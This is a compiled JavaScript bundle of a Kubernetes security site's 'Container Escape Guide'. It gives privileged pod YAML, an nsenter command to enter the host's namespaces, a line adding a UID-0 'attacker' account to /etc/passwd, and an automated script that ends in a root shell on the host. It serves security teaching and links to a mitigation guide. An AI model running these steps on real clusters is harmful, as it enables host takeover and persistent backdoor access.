"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[6452],{2956:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>a,contentTitle:()=>c,default:()=>d,frontMatter:()=>o,metadata:()=>t,toc:()=>h});const t=JSON.parse('{"id":"attack_vectors/container_escape","title":"Container Escape Guide","description":"Step-by-step guide on breaking out of a container and gaining control over the host system.","source":"@site/docs/attack_vectors/container_escape.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/container_escape","permalink":"/k8s_security/docs/attack_vectors/container_escape","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/container_escape.md","tags":[],"version":"current","sidebarPosition":8,"frontMatter":{"sidebar_position":8,"title":"Container Escape Guide","description":"Step-by-step guide on breaking out of a container and gaining control over the host system."},"sidebar":"guidesSidebar","previous":{"title":"Privileged Containers","permalink":"/k8s_security/docs/attack_vectors/privileged_containers"},"next":{"title":"Insecure RBAC Permissions","permalink":"/k8s_security/docs/attack_vectors/insecure_rbac_permissions"}}');var i=s(4848),r=s(8453);const o={sidebar_position:8,title:"Container Escape Guide",description:"Step-by-step guide on breaking out of a container and gaining control over the host system."},c="Container Escape Guide",a={},h=[{value:"<strong>Warning: Security Risk</strong>",id:"warning-security-risk",level:2},{value:"Prerequisites",id:"prerequisites",level:2},{value:"Step 1: Deploy a Test Pod with Required Privileges",id:"step-1-deploy-a-test-pod-with-required-privileges",level:2},{value:"Step 2: Identify the Container Environment",id:"step-2-identify-the-container-environment",level:2},{value:"Check the Container\u2019s Mount Namespace",id:"check-the-containers-mount-namespace",level:3},{value:"Step 3: Escape to the Host\u2019s Namespaces",id:"step-3-escape-to-the-hosts-namespaces",level:2},{value:"Step 4: Create a Root User on the Host",id:"step-4-create-a-root-user-on-the-host",level:2},{value:"<strong>Automated Container Escape Script</strong>",id:"automated-container-escape-script",level:2},{value:"Conclusion",id:"conclusion",level:2}];function l(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"container-escape-guide",children:"Container Escape Guide"})}),"\n",(0,i.jsx)(n.p,{children:"This guide provides a detailed walkthrough of escaping from a container to gain full control over the host system. The process involves entering the host's namespaces and modifying critical system files."}),"\n",(0,i.jsx)(n.h2,{id:"warning-security-risk",children:(0,i.jsx)(n.strong,{children:"Warning: Security Risk"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"The information and the script included in this article are intended for educational and security research purposes only."})," It demonstrates how an attacker can escape a container and gain access to the host system. Running this script on a production system or unauthorized environment can lead to ",(0,i.jsx)(n.strong,{children:"severe security breaches, data loss, and system compromise."})]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Use this script only in a controlled, isolated testing environment where you have explicit permission."})," Misuse of this information may violate company policies or legal regulations."]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"You are responsible for how you use this information."})," Proceed with caution."]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"prerequisites",children:"Prerequisites"}),"\n",(0,i.jsx)(n.p,{children:"To successfully escape from a container, the following conditions must be met:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["The container must run as root (",(0,i.jsx)(n.code,{children:"runAsUser: 0"}),")."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"allowPrivilegeEscalation: true"})," must be enabled."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"hostPID: true"})," must be set to share the host\u2019s process namespace."]}),"\n",(0,i.jsxs)(n.li,{children:["The container must have access to ",(0,i.jsx)(n.code,{children:"/proc/1/root"}),", which exposes the host\u2019s root filesystem."]}),"\n",(0,i.jsxs)(n.li,{children:["The container must have permission to execute ",(0,i.jsx)(n.code,{children:"nsenter"}),"."]}),"\n",(0,i.jsxs)(n.li,{children:["The ",(0,i.jsx)(n.code,{children:"/proc"})," filesystem must be accessible from within the container."]}),"\n",(0,i.jsxs)(n.li,{children:["The container must be running in privileged mode (",(0,i.jsx)(n.code,{children:"privileged: true"}),")."]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"step-1-deploy-a-test-pod-with-required-privileges",children:"Step 1: Deploy a Test Pod with Required Privileges"}),"\n",(0,i.jsx)(n.p,{children:"To demonstrate container escape, use the following YAML file to create a privileged pod:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-yaml",children:'apiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    run: test\n  name: test\nspec:\n  hostPID: true\n  containers:\n  - image: busybox\n    command: ["sleep", "infinity"]\n    securityContext:\n      runAsUser: 0\n      allowPrivilegeEscalation: true\n      privileged: true\n    name: test\n    resources: {}\n  dnsPolicy: ClusterFirst\n  restartPolicy: Always\nstatus: {}\n'})}),"\n",(0,i.jsx)(n.p,{children:"Apply the pod to the cluster:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"kubectl apply -f test-pod.yaml\n"})}),"\n",(0,i.jsx)(n.h2,{id:"step-2-identify-the-container-environment",children:"Step 2: Identify the Container Environment"}),"\n",(0,i.jsx)(n.p,{children:"Before attempting to escape, check if the container is running with elevated privileges and shares the host\u2019s process namespace."}),"\n",(0,i.jsx)(n.h3,{id:"check-the-containers-mount-namespace",children:"Check the Container\u2019s Mount Namespace"}),"\n",(0,i.jsx)(n.p,{children:"Run inside the container:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"ls -l /proc/1/ns/mnt\n"})}),"\n",(0,i.jsx)(n.p,{children:"Example output:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"lrwxrwxrwx 1 root root 0 Mar 17 16:38 /proc/1/ns/mnt -> 'mnt:[4026535581]'\n"})}),"\n",(0,i.jsxs)(n.p,{children:["This confirms that the container is isolated in a separate mount namespace from the host. We\u2019ll override that using ",(0,i.jsx)(n.code,{children:"nsenter"}),"."]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"step-3-escape-to-the-hosts-namespaces",children:"Step 3: Escape to the Host\u2019s Namespaces"}),"\n",(0,i.jsxs)(n.p,{children:["Use ",(0,i.jsx)(n.code,{children:"nsenter"})," to enter the host\u2019s namespaces. This method is more reliable than attempting bind-mounts."]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh\n"})}),"\n",(0,i.jsx)(n.p,{children:"Once inside, verify access:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"hostname\nwhoami\n"})}),"\n",(0,i.jsx)(n.p,{children:"If you\u2019re in the host, you will see the host\u2019s actual hostname and be root."}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"step-4-create-a-root-user-on-the-host",children:"Step 4: Create a Root User on the Host"}),"\n",(0,i.jsx)(n.p,{children:"Now that we\u2019re inside the host context, you can add a root-level user to the host for persistence:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd\n"})}),"\n",(0,i.jsx)(n.p,{children:"To verify:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"grep attacker /etc/passwd\n"})}),"\n",(0,i.jsx)(n.p,{children:"Expected output:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"attacker:x:0:0::/root:/bin/bash\n"})}),"\n",(0,i.jsxs)(n.p,{children:["This creates a user named ",(0,i.jsx)(n.code,{children:"attacker"})," with UID 0 (root privileges)."]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"automated-container-escape-script",children:(0,i.jsx)(n.strong,{children:"Automated Container Escape Script"})}),"\n",(0,i.jsx)(n.p,{children:"The following script automates the process of escaping a container by:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Entering the host\u2019s namespaces."}),"\n",(0,i.jsx)(n.li,{children:"Adding a new root user for persistence."}),"\n",(0,i.jsx)(n.li,{children:"Providing an interactive shell on the host."}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/sh\n\necho "[*] Checking if the container has access to the host\'s root filesystem..."\nif [ ! -d "/proc/1/root" ]; then\n    echo "[-] Cannot access /proc/1/root. Escape is not possible."\n    exit 1\nfi\n\necho "[+] Host root filesystem detected at /proc/1/root."\n\n# Step 1: Ensure full namespace entry using exec nsenter\necho "[*] Attempting to enter the host\'s namespaces..."\n\nexec nsenter --target 1 --mount --uts --ipc --net --pid --root=/proc/1/root /bin/sh -c \'\n    echo "[+] Successfully entered host namespaces."\n\n    # Step 2: Modify /etc/passwd on the host to add an attacker user\n    echo "[*] Adding attacker user to /etc/passwd..."\n    echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd\n\n    echo "[+] Attacker user added. Verifying..."\n    grep attacker /etc/passwd\n\n    echo "[+] Escape complete. You are now inside the host."\n\n    # Step 3: Verify the escape\n    echo "[*] Checking system state..."\n    echo "Hostname: $(hostname)"\n    echo "User: $(whoami)"\n    echo "[*] Checking if host kubelet process is visible..."\n    ps aux | grep kubelet\n\n    # Step 4: Open an interactive shell inside the host\n    exec /bin/sh\n\'\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"conclusion",children:"Conclusion"}),"\n",(0,i.jsx)(n.p,{children:"You successfully escaped the container by:"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["Deploying a privileged pod with ",(0,i.jsx)(n.code,{children:"hostPID: true"}),"."]}),"\n",(0,i.jsxs)(n.li,{children:["Using ",(0,i.jsx)(n.code,{children:"nsenter"})," to join the host\u2019s namespaces."]}),"\n",(0,i.jsx)(n.li,{children:"Adding a root user to the host."}),"\n",(0,i.jsx)(n.li,{children:"Gaining an interactive root shell on the host."}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"To learn how to prevent container escape vulnerabilities, refer to the mitigation guide:"}),"\n",(0,i.jsxs)(n.p,{children:["\u27a1 ",(0,i.jsx)(n.a,{href:"https://geek-kb.github.io/k8s_security/docs/best_practices/cluster_setup_and_hardening/pod_security/container_escape_mitigation/",children:"Preventing Container Escape"})]})]})}function d(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(l,{...e})}):l(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>o,x:()=>c});var t=s(6540);const i={},r=t.createContext(i);function o(e){const n=t.useContext(r);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);